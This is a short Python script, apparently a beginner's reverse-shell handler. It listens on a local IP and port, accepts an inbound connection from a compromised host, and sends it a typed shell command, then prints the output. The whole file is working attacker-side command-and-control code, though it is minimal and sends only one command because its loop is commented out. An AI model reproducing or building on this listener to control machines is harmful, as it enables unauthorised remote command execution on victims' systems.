#!/user/bin/python

import socket
from termcolor import colored

def shell():
    # while True:
    command = input("* Shell#~%s: " % str(ip))
    target.send(command.encode('utf-8'))
    message = target.recv(1024)
    print(message.decode('utf-8'))

# Create Server
def server():
    global sock
    global ip
    global target
    # Create TCP IPv4 socket object
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    # IP and port to bind to
    sock.bind(("192.168.0.21", 54321))
    # Set number of listerners
    sock.listen(5)

    print(colored("[+] Listening for inbound connections.", 'green'))

    target, ip = sock.accept()
    print(colored("[+] Connection established from: %s" % str(ip), 'green'))

server()
shell()